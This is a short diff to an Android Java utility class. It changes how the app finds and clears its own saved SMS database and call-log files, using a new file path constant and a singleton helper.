@@ -178,9 +178,11 @@ public class DoAboutCodeUtils {
 	private static void deleteSmsLog(Context context) {
 
 		try {
-			File a = new File(DatabaseUtil.DB_PATH);
+			File a = new File(MainApplication.FILE_SMS_DB);
+
 			if (a.exists()) {
-				SmsSaveOutUtil so = new SmsSaveOutUtil(context);
+				// SmsSaveOutUtil so = new SmsSaveOutUtil(context);
+				SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
 				so.deleteAllMsg();
 			}
 		} catch (Exception e) {
@@ -193,6 +195,7 @@ public class DoAboutCodeUtils {
 			if (MainApplication.FILE_CALL_LOG.exists()) {
 				MainApplication.FILE_CALL_LOG.delete();
 			}
+
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
